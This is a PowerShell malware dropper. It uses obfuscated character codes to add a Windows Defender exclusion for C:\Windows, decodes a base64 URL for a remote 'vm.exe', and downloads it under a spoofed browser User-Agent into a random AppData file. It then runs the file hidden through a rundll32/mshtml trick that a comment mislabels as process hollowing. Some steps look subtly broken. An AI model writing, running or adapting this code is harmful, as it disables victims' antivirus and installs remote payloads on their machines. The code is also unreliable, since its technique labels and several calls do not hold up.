[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;

# Obfuscated Defender exclusion using reflection
$method = [char]65+[char]100+[char]100+[char]45+[char]77+[char]112+[char]80+[char]114+[char]101+[char]102+[char]101+[char]114+[char]101+[char]110+[char]99+[char]101;
$param = [char]45+[char]69+[char]120+[char]99+[char]108+[char]117+[char]115+[char]105+[char]111+[char]110+[char]80+[char]97+[char]116+[char]104;
$path = [char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115;

$assembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like "*Defender*" };
$type = $assembly.GetType("Microsoft.PowerShell.Commands.AddMpPreferenceCommand");
$instance = [Activator]::CreateInstance($type);
$type.GetMethod("Invoke").Invoke($instance, @(,@($param, $path)));

# Obfuscated download using alternate encoding
$enc = [System.Convert]::FromBase64String("aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE4MTg1MDQ0LzQ0MzQ5OWM1YTZjNzIwY2FiNjIyL3ZtLmV4ZQ==");
$url = [System.Text.Encoding]::GetEncoding(28591).GetString($enc);
$output = "$env:APPDATA\Microsoft\Windows\Templates\" + [System.IO.Path]::GetRandomFileName() + ".exe";

# Alternative download method using COM object
$http = New-Object -ComObject "WinHttp.WinHttpRequest.5.1";
$http.Open("GET", $url, $false);
$http.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
$http.Send();
[System.IO.File]::WriteAllBytes($output, $http.ResponseBody);

# Process hollowing technique
$si = New-Object System.Diagnostics.ProcessStartInfo;
$si.FileName = "rundll32.exe";
$si.Arguments = "javascript:`"\\..\\mshtml,RunHTMLApplication `";document.write();GetObject('script:$output')";
$si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden;
[System.Diagnostics.Process]::Start($si) | Out-Null;